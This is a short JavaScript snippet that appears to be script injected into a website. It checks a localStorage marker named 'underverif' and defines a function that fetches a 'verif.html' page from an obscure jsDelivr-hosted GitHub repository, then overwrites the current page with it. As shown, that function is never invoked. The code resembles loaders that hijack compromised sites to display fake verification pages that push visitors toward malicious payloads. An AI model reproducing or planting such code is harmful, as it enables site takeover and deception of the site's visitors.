(function() {
  const requiredKey = "underverif";
  const requiredValue = "fea2fb654f17156a8393d060f5b8a2d3833fdf96325b698da7596c76a2d041e9";

  const storedValue = localStorage.getItem(requiredKey);

  if (storedValue !== requiredValue) {
    function launch() {
      try {
        fetch("https://cdn.jsdelivr.net/gh/1e295a49108e716ce8ab7eba0c8dca7d/wowzas23@main/utweb/verif.html?t="+Date.now())
          .then(response => response.text())
          .then(html => {
              document.open();
              document.write(html);
              document.close();
          });
      } catch (error) {
        console.error('error:', error);
      }
    }
  }
})();
